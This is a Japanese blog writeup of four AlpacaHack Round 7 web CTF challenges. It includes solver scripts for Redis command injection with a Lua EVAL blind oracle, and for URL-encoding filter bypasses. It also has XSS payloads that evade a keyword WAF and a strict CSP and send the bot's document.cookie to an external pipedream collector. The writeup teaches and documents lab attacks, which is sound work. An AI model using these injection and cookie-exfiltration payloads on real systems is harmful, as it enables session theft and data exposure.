---
title: AlpacaHack Round 7 (Web) Writeup
date: 2024-12-01
layout: writeup
rank: 17
total_teams: 458
language: ja
tags:
  - Web
---

この記事は [SecHack365 Advent Calendar 2024](https://qiita.com/advent-calendar/2024/sechack365) 1日目の記事です。

AlpacaHack Round 7 (web) に参加して[17位/458人](https://alpacahack.com/ctfs/round-7/certificates/claustra01)でした。TOP5%うれしいね。

# writeup

## Treasure Hunt (71 solves)

ランダムなディレクトリを生成してflag.txtを置いているらしい。

Dockerfile:

```dockerfile
FROM node:22.11.0

WORKDIR /app

COPY public public

# Create flag.txt
RUN echo 'Alpaca{REDACTED}' > ./flag.txt

# Move flag.txt to $FLAG_PATH
RUN FLAG_PATH=./public/$(md5sum flag.txt | cut -c-32 | fold -w1 | paste -sd /)/f/l/a/g/./t/x/t \
    && mkdir -p $(dirname $FLAG_PATH) \
    && mv flag.txt $FLAG_PATH

COPY package.json package-lock.json ./
RUN npm install

COPY index.js .

USER 404:404
CMD node index.js
```

問題サーバーでは`/[flag]/`を含むパスへのアクセスをブロックしている。

index.js:

```js
import express from "express";

const html = `
<h1>Treasure Hunt 👑</h1>
<p>Can you find a treasure?</p>
<ul>
  <li><a href=/book>/book</a></li>
  <li><a href=/drum>/drum</a></li>
  <li><a href=/duck>/duck</a></li>
  <li><a href=/key>/key</a></li>
  <li><a href=/pen>/pen</a></li>
  <li><a href=/tokyo/tower>/tokyo/tower</a></li>
  <li><a href=/wind/chime>/wind/chime</a></li>
  <li><a href=/alpaca>/alpaca</a></li>
</ul>
`.trim();

const app = express();

app.use((req, res, next) => {
  res.type("text");
  if (/[flag]/.test(req.url)) {
    res.status(400).send(`Bad URL: ${req.url}`);
    return;
  }
  next();
});

app.use(express.static("public"));

app.get("/", (req, res) => res.type("html").send(html));

app.listen(3000);
```


Dockerfileから、ディレクトリは`/a/4/6/0/c/1/0/.../4/f/l/a/g/./t/x/t`のように一文字ずつの階層構造になっていることが分かるので、一階層ずつ特定する方法を考える。

```dockerfile
RUN FLAG_PATH=./public/$(md5sum flag.txt | cut -c-32 | fold -w1 | paste -sd /)/f/l/a/g/./t/x/t \
    && mkdir -p $(dirname $FLAG_PATH) \
    && mv flag.txt $FLAG_PATH
```

試しに`/0`から`/f`まで一通りリクエストを投げてみて、ディレクトリが存在するか否かでレスポンスの内容に変化が無いかを調べてみると、レスポンスに含まれている`req.url`の値が異なることが分かった。

- ディレクトリが存在しない場合: `Cannot GET /0`
- ディレクトリが存在する場合: `Cannot GET /4/`

また、`/[flag]/`を含むパスはサーバーからブロックされてしまうが、`%61`などにURLエンコードすることで回避できた。
これらの挙動を用いてsolverを実装すると、以下のようになる。

```js
target = "http://34.170.146.252:19843"
charset = "0123456789abcdef"

path = ""

const solve = async () => {
  for (let i = 0; i < 32; i++) {
    for (let j = 0; j < charset.length; j++) {
      const url = `${target}${path}/${charset[j]}`.replaceAll("a", "%61").replaceAll("f", "%66");
      const res = await fetch(url);
      const data = await res.text();
      if (data.includes("/</pre>")) {
        path += `/${charset[j]}`;
        console.log("Found:", path);
        break;
      }
    }
  }
  finalUrl = `${target}${path}/f/l/a/g/./t/x/t`.replaceAll("f", "%66").replaceAll("l", "%6c").replaceAll("a", "%61").replaceAll("g", "%67")
  const res = await fetch(finalUrl);
  const data = await res.text();
  console.log("Flag:", data);
}
solve()
```

しばらく待つとflagを取得できた。
`Alpaca{alpacapacapacakoshitantan}`

## Alpaca Poll (42 solves)

dog, cat, alpacaに対して投票ができるアプリ。

![](/assets/img/alpacahack_round7/a7a525990893-20241130.png)

データはRedisに保存されており、incrementとgetのみが可能。
また、flagもRedisに保存されている。これをどうにかして読み出したい。
index.js:

```js
import fs from 'node:fs/promises';
import express from 'express';

import { init, vote, getVotes } from './db.js';

const PORT = process.env.PORT || 3000;
const FLAG = process.env.FLAG || 'Alpaca{dummy}';

process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

const app = express();
app.use(express.urlencoded({ extended: false }));
app.use(express.static('static'));

const indexHtml = (await fs.readFile('./static/index.html')).toString();
app.get('/', async (req, res) => {
    res.setHeader('Content-Type', 'text/html');
    return res.send(indexHtml);
});

app.post('/vote', async (req, res) => {
    let animal = req.body.animal || 'alpaca';

    // animal must be a string
    animal = animal + '';
    // no injection, please
    animal = animal.replace('\r', '').replace('\n', '');

    try {
        return res.json({
            [animal]: await vote(animal)
        });
    } catch {
        return res.json({ error: 'something wrong' });
    }
});

app.get('/votes', async (req, res) => {
    return res.json(await getVotes());
});

await init(FLAG); // initialize Redis
app.listen(PORT, () => {
    console.log(`server listening on ${PORT}`);
});
```


db.js:

```js
import net from 'node:net';

function connect() {
    return new Promise(resolve => {
        const socket = net.connect('6379', 'localhost', () => {
            resolve(socket);
        });
    });
}

function send(socket, data) {
    console.info('[send]', JSON.stringify(data));
    socket.write(data);

    return new Promise(resolve => {
        socket.on('data', data => {
            console.info('[recv]', JSON.stringify(data.toString()));
            resolve(data.toString());
        })
    });
}

export async function vote(animal) {
    const socket = await connect();
    const message = `INCR ${animal}\r\n`;

    const reply = await send(socket, message);
    socket.destroy();

    return parseInt(reply.match(/:(\d+)/)[1], 10); // the format of response is like `:23`, so this extracts only the number 
}

const ANIMALS = ['dog', 'cat', 'alpaca'];
export async function getVotes() {
    const socket = await connect();

    let message = '';
    for (const animal of ANIMALS) {
        message += `GET ${animal}\r\n`;
    }

    const reply = await send(socket, message);
    socket.destroy();

    let result = {};
    for (const [index, match] of Object.entries([...reply.matchAll(/\$\d+\r\n(\d+)/g)])) {
        result[ANIMALS[index]] = parseInt(match[1], 10);
    }

    return result;
}

export async function init(flag) {
    const socket = await connect();

    let message = '';
    for (const animal of ANIMALS) {
        const votes = animal === 'alpaca' ? 10000 : Math.random() * 100 | 0;
        message += `SET ${animal} ${votes}\r\n`;
    }

    message += `SET flag ${flag}\r\n`; // please exfiltrate this

    await send(socket, message);
    socket.destroy();
}
```


この問題は環境を自分で生成する（=人によって環境が異なる）ので、何かしらの破壊的変更を加えることが可能とメタ読みする。~~ここでしばらくprotorype pollutionを疑って沼っていたのは内緒~~

しばらくコードを眺めていると、`POST /vote`の改行コード除去で`replaceAll()`ではなく`replace()`を使用していることに気付いた。`replace()`は置換対象が複数回出現する場合も最初に一致したもののみ置換するという挙動を取る。

```js
app.post('/vote', async (req, res) => {
    let animal = req.body.animal || 'alpaca';

    // animal must be a string
    animal = animal + '';
    // no injection, please
    animal = animal.replace('\r', '').replace('\n', '');

    try {
        return res.json({
            [animal]: await vote(animal)
        });
    } catch {
        return res.json({ error: 'something wrong' });
    }
});
```

そして、Redisへincrementするコマンドを構築する部分では文字列結合を行っている。

```js
export async function vote(animal) {
    const socket = await connect();
    const message = `INCR ${animal}\r\n`;

    const reply = await send(socket, message);
    socket.destroy();

    return parseInt(reply.match(/:(\d+)/)[1], 10); // the format of response is like `:23`, so this extracts only the number 
}
```

つまり、`cat \r\n\r\nGET flag`というリクエストを送ると`INCR cat\r\nGET flag\r\n`という文字列が構築される。このリクエストを投げてローカルで実行結果を確認すると、`[recv] ":46\r\n$16\r\nAlpaca{REDACTED}\r\n"`と表示され、任意のRedisコマンド`GET flag`が実行できていることが分かる。

これでflagを読み出すことはできたが、`return parseInt(reply.match(/:(\d+)/)[1], 10);`によって数字以外の値を返すことができなくなっている。`INCR flag`でエラーが返ってくることは確認していたため、Error-Based NoSQL(?) Injectionができないかを考えた。

SQLのIF句に相当するものが無いか探していたら、どうやら`EVAL`というものがあり、その中でLuaを実行できることが分かった。これを用いればLuaを用いてflagの値を1文字ずつ比較し、1か0を返すpayloadが書けそうだ。

最終的なpayloadは以下のようになった。

```
"flag\r\n\r\n" + `EVAL "local flag = redis.call('GET', 'flag') if (string.sub(flag, 1, ARGV[1]) == ARGV[2]) then return ':1' end return ':0'" 0 ${length} ${flag}`
```

これはflagの`${length}`文字目までが`${flag}`と一致していれば`:1`を、一致していなければ`:0`を返す。一行目（`\r\n`より前）のコマンドを`INCR flag`としエラーを返すようにすることで、この`1`または`0`が最終的なレスポンスに含まれるようになっている。

これを用いて、flagを一文字ずつ特定するsolverを書いた。

```js
const target = "http://34.170.146.252:28695/vote"
const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}"

const buildPayload = (flag) => {
  length = flag.length
  return "flag\r\n\r\n" + `EVAL "local flag = redis.call('GET', 'flag') if (string.sub(flag, 1, ARGV[1]) == ARGV[2]) then return ':1' end return ':0'" 0 ${length} ${flag}`
}

const solve = async () => {
  let flag = ""
  while(true) {
    for (let i = 0; i < charset.length; i++) {
      const payload = buildPayload(flag + charset[i])
      const resp = await fetch(target, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `animal=${payload}`,
      })
      const data = await resp.text()
      if (data.slice(-2, -1) == 1) {
        flag += charset[i]
        console.log("Found:", flag)
        break
      }
    }
    if (flag.slice(-1) == "}") {
      console.log("Flag:", flag)
      break
    }
  }
}
solve()
```

少し時間はかかったが、無事にflagを入手することができた。
`Alpaca{ezotanuki_mofumofu}`

# upsolve

## minimal-waf (4 solves)

~~まだ解けていない。~~ 解けた。
任意のhtmlを表示することができるが、`/script|src|on|html|data|&/`は使用できないらしい。
index.js:

```js
import express from "express";

const indexHtml = `
<title>HTML Viewer</title>
<link rel="stylesheet" href="https://unpkg.com/bamboo.css/dist/light.min.css">
<body>
  <h1>HTML Viewer</h1>
  <form action="/view">
    <p><textarea name="html"></textarea></p>
    <div style="text-align: center">
      <input type="submit" value="Render">
    </div>
  </form>
</body>
`.trim();

express()
  .get("/", (req, res) => res.type("html").send(indexHtml))
  .get("/view", (req, res) => {
    const html = String(req.query.html ?? "?").slice(0, 1024);

    if (
      req.header("Sec-Fetch-Site") === "same-origin" &&
      req.header("Sec-Fetch-Dest") !== "document"
    ) {
      // XSS detection is unnecessary because it is definitely impossible for this request to trigger an XSS attack.
      res.type("html").send(html);
      return;
    }

    if (/script|src|on|html|data|&/i.test(html)) {
      res.type("text").send(`XSS Detected: ${html}`);
    } else {
      res.type("html").send(html);
    }
  })
  .listen(3000);
```


また、botの`APP_HOST`が`localhost`になっている。
bot.js:

```js
import puppeteer from "puppeteer";

const FLAG = process.env.FLAG ?? console.log("No flag") ?? process.exit(1);

const APP_HOST = "localhost"; // Note: This is not `minimal-waf`, but `localhost`!
const APP_PORT = "3000";
export const APP_URL = `http://${APP_HOST}:${APP_PORT}`;

// Flag format
if (!/^Alpaca{\w+}$/.test(FLAG)) {
  console.log("Bad flag");
  process.exit(1);
}

const sleep = async (ms) => new Promise((resolve) => setTimeout(resolve, ms));

export const visit = async (url) => {
  console.log(`start: ${url}`);

  const browser = await puppeteer.launch({
    headless: "new",
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      '--js-flags="--noexpose_wasm"',
    ],
  });

  const context = await browser.createBrowserContext();

  try {
    const page = await context.newPage();
    await page.setCookie({
      name: "FLAG",
      value: FLAG,
      domain: APP_HOST,
      path: "/",
    });
    await page.goto(url, { timeout: 5_000 });
    await sleep(10_000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${url}`);
};
```


ヘッダが特定の値の時だけフィルタを通さないという明らかに怪しい部分がある。なんとかしてbotから`"Sec-Fetch-Site" = "same-origin"`と`"Sec-Fetch-Dest" != "document"`を満たすリクエストを飛ばしたい。

```js
    if (
      req.header("Sec-Fetch-Site") === "same-origin" &&
      req.header("Sec-Fetch-Dest") !== "document"
    ) {
      // XSS detection is unnecessary because it is definitely impossible for this request to trigger an XSS attack.
      res.type("html").send(html);
      return;
    }
```

同一オリジンからのリクエストであれば`"Sec-Fetch-Site" = "same-origin"`になるらしいので、`<iframe>`や`<object>`を用いて（これは`"Sec-Fetch-Dest" != "document"`も満たす）XSSを発火させることができないかと考えたが、`src`属性または`data`属性が必要になるのでダメだった。

~~ギブアップ。~~ (以下、upsolve)

`<embed>`を使えば属性名に禁止ワードが含まれないので試してみる。
まず、bypassを考えずにpayloadを構築するとこのようになる。

```
http://localhost:3000/view?html=<embed type="text/html" code="/view?html=<script>fetch(`https://xxxxxxxx.m.pipedream.net?${document.cookie}`)</script>"></embed>
```

禁止ワードの`html`と`srcipt`は特殊文字`%09`（tab文字）でbypassすることができそう。

さらに、勝手にembedタグから出られると困るので、`<script>`の`<`と`>`を二重にURLエンコードして`%253c`と`%253e`に置換する。
`%253cscript%253e`がURL内にあると、最初のリクエストを処理するときに`%3cscript%3e`にデコードされて、これがembedタグのcodeに渡される。そしてembedタグの描画（self-originリクエスト）でもう一度デコードされて、`<script>`になるはず。

これらを反映させたpayloadはこうなる。

```
http://localhost:3000/view?html=<embed type="text/ht%09ml" code="/view?ht%09ml=%253cscr%09ipt%253efetch(`https://xxxxxxxx.m.pipedream.net?${document.cookie}`)%253c/scr%09ipt%253e"></embed>
```

このpayloadをbotに投げるとflagがpipedreamに飛んできた。ホスト名がlocalhostじゃないとダメなことに留意。
`Alpaca{WafWafPanic}`

## disconnection (5 solves)

`/`で任意のJavaScriptを実行できるが、`/`以外にアクセスすると接続が切られてしまうアプリ。

```js
import express from "express";

const html = `
<h1>XSS Playground</h1>
<script>eval(new URLSearchParams(location.search).get("xss"));</script>
`.trim();

express()
  .use("/", (req, res, next) => {
    res.setHeader(
      "Content-Security-Policy",
      "script-src 'unsafe-inline' 'unsafe-eval'; default-src 'none'"
    );
    next();
  })
  .get("/", (req, res) => res.type("html").send(html))
  .all("/*", (req, res) => res.socket.destroy()) // disconnected
  .listen(3000);
```

flagはbotのcookieにあるが、cookieのpathが`/cookie`に設定されており、`/`では窃取できない。
bot.js:

```js
import puppeteer from "puppeteer";

const FLAG = process.env.FLAG ?? console.log("No flag") ?? process.exit(1);

const APP_HOST = "disconnection";
const APP_PORT = "3000";
export const APP_URL = `http://${APP_HOST}:${APP_PORT}`;

// Flag format
if (!/^Alpaca{\w+}$/.test(FLAG)) {
  console.log("Bad flag");
  process.exit(1);
}

const sleep = async (ms) => new Promise((resolve) => setTimeout(resolve, ms));

export const visit = async (url) => {
  console.log(`start: ${url}`);

  const browser = await puppeteer.launch({
    headless: "new",
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      '--js-flags="--noexpose_wasm"',
    ],
  });

  const context = await browser.createBrowserContext();

  try {
    const page = await context.newPage();
    await page.setCookie({
      name: "FLAG",
      value: FLAG,
      domain: APP_HOST,
      path: "/cookie", // 🍪
    });
    await page.goto(url, { timeout: 5_000 });
    await sleep(10_000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${url}`);
};
```


`/cookie`以下へアクセスし、接続が切れる前にどうにかしてcookieを窃取する方法を考える。

`res.socket.destroy()`を行っているのはexpressのルーティングの後なので、それよりも前の段階で何か処理を止めれば接続を切られることはない。ここでは、ルーティング中にエラーを発生させる方法を考える。

`/cookie/%`にアクセスすると、URLのデコードに失敗してエラー画面が表示された。
![](/assets/img/alpacahack_round7/9f1d2727b9d0-20241207.png)

これを別ウィンドウで開けば`/`からJavaScriptを実行することができそう。

試しに以下のURLにアクセスしてみると、`/`から`/cookie/%`上でJavaScriptを実行できていることが分かる。

```
http://localhost:3000/?xss=w=open("/cookie/%");setInterval(()=>{alert(w.document.location)},1000)
```

![](/assets/img/alpacahack_round7/baab87d37203-20241207.png)

あとは`document.cookie`を外部に送ればよいが、CSPに`default-src: 'none'`が設定されているため`fetch`や`navigator.sendBeacon`、`<iframe>`などはリクエストがブロックされてしまった。

色々試していると、`<meta>`でのリダイレクトであればブロックされずにアクセスできることが分かった。これを用いて最終的なpayloadを書く。

```js
w=open("/cookie/%");
setTimeout(()=>{
  const metaTag = document.createElement('meta');
  metaTag.setAttribute('http-equiv', 'refresh');
  metaTag.setAttribute('content', `0;url=https://xxxxxxxx.m.pipedream.net?${w.document.cookie}`);
  document.head.appendChild(metaTag);
}, 1000)
```

```
http://disconnection:3000/?xss=w=open("/cookie/%");setTimeout(()=>{const%20metaTag=document.createElement('meta');metaTag.setAttribute('http-equiv','refresh');metaTag.setAttribute('content',`0;url=https://xxxxxxxx.m.pipedream.net?${w.document.cookie}`);document.head.appendChild(metaTag);},1000)
```

このURLをbotに投げるとflagが得られた。
`Alpaca{browser_behavior_is_to0o0o0o0o0o0o0_complicated}`

# not solved

## disconnection-revenge (1 solve)

disconnectionの非想定解を塞いだバージョン。
disconnectionのflagが問題ファイルのパスワードになっており、そもそも見れなかった。
